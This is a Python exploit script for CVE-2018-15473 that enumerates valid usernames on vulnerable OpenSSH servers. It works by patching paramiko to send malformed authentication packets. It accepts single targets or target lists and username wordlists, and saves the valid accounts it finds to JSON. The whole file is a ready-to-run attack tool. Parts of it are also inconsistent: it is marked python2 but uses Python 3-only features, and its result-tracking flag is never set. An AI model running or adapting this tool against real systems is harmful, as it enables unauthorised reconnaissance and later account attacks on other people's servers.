#!/usr/bin/env python2
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter


import argparse, logging, paramiko, socket, sys, os, re
import json
import multiprocessing
import string

TARGET_LIST = []
USERNAME_LIST = []
Q = multiprocessing.Queue()


class InvalidUsername(Exception):
    pass


# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass


# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
    paramiko.common.MSG_SERVICE_ACCEPT]


# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()


# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username


def has_vulnerable(target, port, length: int = 8, number: int = 3):
    while number:
        result = prevent_eof(os.urandom(length).hex(), target, port)
        if not result:
            return True
        number -= 1
    return False


def prevent_eof(username, target, port):
    # This usage is not for multithreading, Prevent EOFerror
    p = multiprocessing.Process(target=has_username, args=(Q, username, target, port))
    p.start()
    p.join()
    return Q.get()


def has_username(queue: multiprocessing.Queue, username: str, target: str, port: int = 22, tried: int = 3):
    sock = socket.socket()
    try:
        sock.connect((target, port))
    except socket.error:
        print('[-] Connecting to {}:{} failed. Please check the specified host and port.'.format(target, port))
        queue.put(False)
        return
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] {}:{}, Failed to negotiate SSH transport.'.format(target, port))
        if tried > 0:
            tried -= 1
            has_username(queue, username, target, port, tried)
        else:
            queue.put(False)
            return
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        queue.put(False)
        return
    except paramiko.ssh_exception.AuthenticationException:
        queue.put(True)
        return
    print('[-] Target: {}:{}, Is this the correct version of OpenSSH?'.format(target, port))
    queue.put(False)
    return


def run(username, target, port):
    if not has_vulnerable(target, port):
        print('[-] Target {}:{} most probably is not vulnerable or already patched'.format(target, port))
        return None
    if prevent_eof(username, target, port):
        print('[+] Target: {}:{}, {} is a valid username.'.format(target, port, username))
    else:
        print('[*] Target: {}:{}, {} is an invalid username.'.format(target, port, username))


def main():
    global TARGET_LIST
    global USERNAME_LIST
    if args.target:
        TARGET_LIST.append(args.target)
    if args.target_file:
        if os.path.isfile(args.target_file):
            with open(args.target_file) as _f:
                TARGET_LIST.extend(_f.read().split())
    if args.username:
        USERNAME_LIST.append(args.username)
    if args.username_file:
        if os.path.isfile(args.username_file):
            with open(args.username_file) as _f:
                USERNAME_LIST.extend(_f.read().split())

    if not TARGET_LIST or not USERNAME_LIST:
        parser.print_help()
        print('\n[!] Missing parameter. Please check whether ip address or user name is set.\n')
        sys.exit(1)

    result_content = []

    for index, target in enumerate(TARGET_LIST):
        ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(:\d{1,5})?', target)
        if not ip_re:
            continue
        if ip_re.groups()[1] != None:
            target, port = ip_re.group(1), int(ip_re.group(2)[1:])
        else:
            target, port = ip_re.group(1), args.port

        init = False
        for username in USERNAME_LIST:
            res = run(username, target, port)
            if res == None:
                result_content.append({'target': '{}:{}'.format(target, port), 'has_vuln': False})
                break
            if not init:
                result_content.append(
                    {'target': '{}:{}'.format(target, port), 'has_vuln': True, 'valid_users': []})
            if res:
                result_content[index]['valid_users'].append(username)
    if args.output:
        dir_path = re.sub(r'[\\/][^\\/]+$', '', args.output)
        if ('/' in dir_path or '\\' in dir_path) and not os.path.isdir(dir_path):
            print('{} is not a valid path'.format(dir_path))
        with open(args.output, 'w') as _f:
            _f.write(json.dumps(result_content))


# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
    parser.add_argument('-t', '--target', help='IP address of the target system')
    parser.add_argument('-T', '--target-file', help='IP address list of the target system')
    parser.add_argument('-p', '--port', type=int, default=22, help='Set port of SSH service')
    parser.add_argument('-u', '--username', help='Username to check for validity.')
    parser.add_argument('-U', '--username-file', help='List of usernames to check for validity.')
    parser.add_argument('-o', '--output', required=False, help='Output json file path.')

    args = parser.parse_args()
    main()
